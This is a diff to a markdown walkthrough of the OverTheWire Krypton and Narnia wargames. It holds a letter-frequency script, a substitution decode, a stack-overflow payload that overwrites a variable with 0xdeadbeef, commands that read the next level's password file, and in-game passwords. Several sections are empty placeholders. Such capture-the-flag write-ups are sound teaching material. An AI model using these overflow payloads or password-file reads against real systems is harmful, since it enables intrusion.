@@ -1183,9 +1183,118 @@ cat HINT1
 cat HINT2
 cat krypton4
 cat README
+temp_dir=$(mktemp -d)
+cd $temp_dir
+cat /krypton/krypton3/found1 /krypton/krypton3/found2 /krypton/krypton3/found3 > combined.txt
+nano frequency_analysis.py
+```
+```python3
+from collections import Counter
+
+# Read combined text
+with open("combined.txt", "r") as f:
+    ciphertext = f.read().replace(" ", "").replace("\n", "")
+
+# Count letter frequencies
+letter_freq = Counter(ciphertext)
+
+# Sort by frequency
+sorted_freq = letter_freq.most_common()
+
+# Print results
+print("Letter Frequency Analysis:")
+for letter, freq in sorted_freq:
+    print(f"{letter}: {freq}")
+```
+```bash
+python3 frequency_analysis.py
+cat /krypton/krypton3/krypton4 | tr 'SQJUBNGCDZVWMYTXKELAFIORHP' 'ETAOINSRHDLUCMFYWGPBVKXQJZ'
+```
+Output:
+```bash
+
+```
+**Password: BRUTE**
+
+## Level 4
+CMD:
+```bash
+ssh krypton4@krypton.labs.overthewire.org -p 2231
+```
+Passowrd:
+```bash
+BRUTE
+```
+Solution:
+```bash
+cd /krypton/krypton4
+ls
+
 ```
 ```python3
 
+```
+```bash
+
+```
+Output:
+```bash
+
+```
+**Password: **
+
+
+# Narnia
+## Level 0
+CMD:
+```bash
+ssh narnia0@narnia.labs.overthewire.org -p 2226
+```
+Passowrd:
+```bash
+narnia0
+```
+Solution:
+```bash
+cd /narnia
+ls
+./narnia0
+```
+```bash
+A
+```
+```bash
+cat narnia0.c
+(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
+```
+Now Your on the Terminal of narnia1
+```bash
+whoami
+cat /etc/narnia_pass/narnia1
+```
+Output:
+```bash
+WDcYUTG5ul
+```
+**Password: WDcYUTG5ul**
+
+## Level 1
+CMD:
+```bash
+ssh narnia1@narnia.labs.overthewire.org -p 2226
+```
+Passowrd:
+```bash
+WDcYUTG5ul
+```
+Solution:
+```bash
+cd /narnia
+ls
+./narnia1
+cat narnia1.c
+
+export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG")')
 ```
 
 Output:
